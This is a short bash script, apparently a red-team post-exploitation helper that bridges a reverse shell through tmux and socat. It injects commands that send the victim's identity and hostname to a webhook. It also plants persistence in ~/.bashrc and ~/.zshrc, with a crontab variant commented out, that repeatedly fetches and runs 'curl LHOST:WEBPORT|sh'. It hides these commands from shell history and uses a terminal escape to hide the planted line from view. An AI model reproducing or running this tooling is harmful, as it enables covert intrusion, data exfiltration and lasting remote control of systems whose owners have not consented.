#!/bin/bash -x

SOCKDIR=$(mktemp -d)
SOCKF=${SOCKDIR}/usock

# Start tmux, if needed
tmux start
# Create window
tmux new-window "socat UNIX-LISTEN:${SOCKF},umask=0077 file:\`tty\`,echo=1"
# Wait for socket
while test ! -e ${SOCKF}; do sleep 1; done
SOCAT_TTY=$(tty)

# space for no history, discord webhook for notif, crontab for persistence
echo "   curl -sk WEBHOOK -d \"content=\\\`\\\`\\\`\$(id;hostname)\\\`\\\`\\\`\"" > ${SOCAT_TTY}
# echo "   if ! crontab -l | grep -iF /dev/tcp/ ; then { crontab -l; echo -e \"* * * * * ps a | grep -F /dev/tcp/ | grep -vF grep || curl LHOST:WEBPORT|sh # MM secu team delete me\x1b[2K\r\"; } | crontab - ; fi" > ${SOCAT_TTY}
echo "   if ! grep -iF /dev/tcp/ ~/.bashrc ; then echo -e \"ps a | grep -F /dev/tcp/ | grep -vF grep || curl LHOST:WEBPORT|sh # MM secu team delete me\x1b[2K\r\" >> ~/.bashrc ; fi" > ${SOCAT_TTY}
echo "   if ! grep -iF /dev/tcp/ ~/.zshrc  ; then echo -e \"ps a | grep -F /dev/tcp/ | grep -vF grep || curl LHOST:WEBPORT|sh # MM secu team delete me\x1b[2K\r\" >> ~/.zshrc  ; fi" > ${SOCAT_TTY}

# Use socat to ship data between the unix socket and STDIO.
exec socat file:${SOCAT_TTY},echo=0 UNIX-CONNECT:${SOCKF}
